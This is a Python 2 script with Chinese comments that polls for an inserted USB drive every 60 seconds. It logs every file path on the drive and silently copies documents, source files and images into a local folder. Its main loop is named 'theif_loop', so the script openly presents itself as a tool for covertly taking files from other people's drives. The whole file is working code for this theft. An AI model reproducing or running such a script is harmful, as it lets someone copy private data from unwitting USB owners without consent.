#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import shutil
import string

if sys.platform.lower() == "darwin":
    print '检测到MacOS系统'
    USB = '/Volumes/'  # MacOS 上挂载的u盘目录
if sys.platform.lower() == "win32":
    print '检测到Windows系统'
    USB = 'G:\\'  # Windows 上挂载的u盘目录
if sys.platform.lower() == "linux2":
    print '检测到Linux系统'
    USB = '/mnt/usb/'  # Linux 上挂载的u盘目录

current_path = os.getcwd()
save_path = current_path+"/copy/"
if not os.path.exists(save_path):
    try:
        os.mkdir(save_path)
    except:
        print 'Save 目录创建失败'

SAVE = save_path  # 文件保存目录
# 注意此目录的上级目录必须存在
OLD = []
# 文件类型
word = "txt,doc,ppt,py,java,cpp,html,js,css,json,md,xls,pdf," \
       "ms10,pdf,jpg,jpeg,png,gif,TXT,DOC,PPT,PY,JAVA,CPP,HTML," \
       "JS,CSS,MD,XLS,PDF,MS10,PDF,JPG,JPEG,PNG,GIF".split(",")[:-1]


# 判断文件是否需要复制
def value(file):
    if not os.path.isfile(file):
        return False
    for i in word:
        if string.find(file, i) > -1:
            return True
    return False


# 拷贝文件
def copyfile(file, filename):
    print SAVE+time.strftime("%m%d%H%M", time.localtime(time.time()))+filename
    shutil.copy(file, SAVE+time.strftime("%m%d%H%M", time.localtime(time.time()))+"#"+filename)


# U盘遍历
def usb_walker():
    if not os.path.exists(SAVE):
        os.mkdir(SAVE)
    print "开始抓取U盘"
    f = open(SAVE+time.strftime("%m%d%H%M", time.localtime(time.time()))+".txt", "w")
    for root, dirs, files in os.walk(USB):
        for file in files:
            export = os.path.join(root, file)
            f.writelines(export+'\n')
            try:
                if value(export):
                    print "复制#"+export
                    copyfile(export,file)
            except:
                 print("文件已经忽略")
    f.close()
    print "拷贝文件完成"


# 简单判断U盘内容是否变化
def getusb():
    global OLD
    NEW = os.listdir(USB)
    if len(NEW) == len(OLD):
        print "U盘内容没有变化"
        return False
    else:
        OLD = NEW
        return True


def theif_loop():
    sleep_time = 60  # loop休眠时间
    while (True):
        if os.path.exists(USB):
            print "检测到U盘"
            if getusb():
                try:
                    usb_walker()
                except:
                    print "未知错误"
        else:
            print "暂时没有U盘"
        print "开始休眠"
        print "休眠时间{sleep_time}s".format(sleep_time=sleep_time)
        time.sleep(sleep_time)  # 休眠时间
        print "休眠结束"

if __name__ == "__main__":
    theif_loop()